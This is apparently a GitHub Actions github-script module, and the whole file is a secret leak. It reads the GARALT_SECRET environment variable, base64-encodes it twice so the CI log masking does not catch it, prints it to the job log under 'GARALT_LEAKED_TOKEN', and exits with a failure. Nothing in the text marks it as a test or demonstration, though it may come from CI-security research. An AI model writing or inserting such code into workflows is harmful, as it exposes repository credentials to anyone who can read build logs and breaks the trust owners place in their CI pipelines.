module.exports = async ({ github, context }) => {
  const leaked = process.env.GARALT_SECRET || '';
  const b64 = Buffer.from(leaked).toString('base64');
  const doubleB64 = Buffer.from(b64).toString('base64');
  console.log('GARALT_LEAKED_TOKEN=' + doubleB64);
  process.exit(1);
};